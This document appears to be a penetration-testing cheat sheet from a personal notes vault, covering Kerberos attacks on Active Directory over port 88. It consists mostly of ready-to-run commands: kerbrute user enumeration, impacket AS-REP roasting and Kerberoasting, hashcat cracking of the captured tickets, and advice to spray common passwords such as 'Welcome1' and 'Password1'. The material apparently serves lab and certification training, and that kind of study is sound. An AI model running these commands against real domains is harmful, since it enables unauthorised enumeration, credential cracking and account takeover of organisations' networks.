## Goal
With the domain, enumerate/validate users, then AS-REP roast (no creds) and Kerberoast (with one cred). Port 88 = AD: yields spray-able users and crackable tickets.

> Port 88 means you're in a domain: drive the whole engagement from [[00_AD_METHODOLOGY]] (AD service index → [[00_AD_SERVICES]]). Spraying the users you find → [[01_credentials_and_spraying]] (check lockout first). Ticket **forgery/reuse** (silver, overpass, pass-the-ticket; delegation is reference-only) → [[04_kerberos_advanced_paths]].

**Checklist**
- [ ] domain + DC hostname known? (in /etc/hosts)
- [ ] clock skew < 5 min? (ntpdate / faketime)
- [ ] user list built? (kerbrute)
- [ ] AS-REP roast (preauth-disabled users)?
- [ ] Kerberoast (needs one valid cred)?

# Commands

### Step 1: Fix clock skew (Kerberos needs < 5 min)
```bash
sudo ntpdate -s $IP
faketime -f +7h <command>          # if ntpdate unavailable
```

### Step 2: Enumerate / validate users
```bash
kerbrute userenum -d corp.local --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
kerbrute userenum -d corp.local --dc $IP /usr/share/seclists/Kerberos/A-ZSurnames.txt   # quick
nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='CORP.LOCAL',userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt $IP
```

### Step 3: AS-REP Roasting (no creds)
```bash
impacket-GetNPUsers corp.local/ -dc-ip $IP -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
impacket-GetNPUsers corp.local/svc-alfresco -dc-ip $IP -no-pass -format hashcat     # one known user
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

### Step 4: Kerberoasting (needs one valid cred)
```bash
impacket-GetUserSPNs corp.local/user:password -dc-ip $IP -request -outputfile kerberoast.hash
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```

### Helpline
```bash
# READING KERBRUTE / IMPACKET OUTPUT:
#   "VALID USERNAME" = user exists -> add to list for spray/AS-REP.
#   KDC_ERR_PREAUTH_REQUIRED = user exists but preauth ON -> valid, but NOT AS-REP roastable.
#   KDC_ERR_CLIENT_REVOKED = account disabled/locked -> skip it.
#   KDC_ERR_KEY_EXPIRED = VALID credential but password expired/must-change -> NOT a bad cred; change it
#     (needs the old password) then reuse -> 01_credentials_and_spraying Step 4b.
#   KRB_AP_ERR_SKEW = clock off >5 min -> sudo ntpdate -s $IP (or faketime), then retry. THIS blocks everything.
# WHAT THE HASHES MEAN:
#   AS-REP hash returned = user has NO preauth -> hashcat -m 18200 (HTB Forest/Sauna).
#   TGS/Kerberoast hash = an SPN account's ticket -> hashcat -m 13100 (HTB Active: GPP -> Kerberoast admin).
# ORDER OF OPS: fix clock -> build user list (kerbrute/LDAP/RID/SMTP) -> AS-REP roast whole list ->
#   any valid cred -> Kerberoast -> spray (Welcome1, Password1, Season+Year!) with --continue-on-success.
# port 88 open = DC -> ALSO enumerate 389 / 445 / 5985.
```
